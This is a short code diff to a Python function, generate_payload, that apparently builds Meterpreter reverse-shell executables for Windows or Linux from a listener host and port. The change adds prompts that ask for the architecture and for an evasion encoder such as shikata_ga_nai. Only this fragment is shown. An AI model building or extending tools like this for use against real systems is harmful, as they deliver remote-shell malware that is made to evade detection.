@@ -12,7 +12,9 @@ def generate_payload(platform, lhost, lport, outfile):
         "windows": "exe",
         "linux": "elf"
     }
-
+    
+    arch = input("Architecture (x86 | x64): ").strip()
+    encoder = input("Encoder (e.g., x86 | shikata_ga_nai): ").strip()
     payload = payloads.get(platform, "windows/meterpreter/reverse_tcp")
     outformat = formats.get(platform, "exe")
     filename = f"{outfile}.{outformat}"
